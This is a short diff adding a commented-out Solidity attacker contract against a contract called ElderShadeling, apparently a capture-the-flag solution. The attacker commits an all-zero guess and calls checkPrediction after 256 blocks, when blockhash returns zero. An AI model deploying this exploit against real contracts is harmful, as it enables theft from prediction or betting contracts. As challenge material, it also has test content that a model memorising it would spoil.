@@ -24,3 +24,35 @@ contract ElderShadeling {
     }
     
 }
+
+// // SPDX-License-Identifier: MIT
+// pragma solidity ^0.8.19;
+
+// interface ElderShadeling {
+//     function commitPrediction(bytes32 _guess) external;
+//     function checkPrediction() external;
+// }
+
+// contract Attacker {
+//     ElderShadeling public target;
+//     bool public committed;
+
+//     constructor(address targetAddress) {
+//         target = ElderShadeling(targetAddress);
+//     }
+
+//     function commit() external {
+//         require(!committed, "Prediction already committed");
+        
+//         // Commit a guess of all zeros
+//         target.commitPrediction(0x0000000000000000000000000000000000000000000000000000000000000000);
+//         committed = true;
+//     }
+
+//     function check() external {
+//         require(committed, "Prediction not committed");
+        
+//         // Call checkPrediction after waiting for 256 blocks
+//         target.checkPrediction();
+//     }
+// }
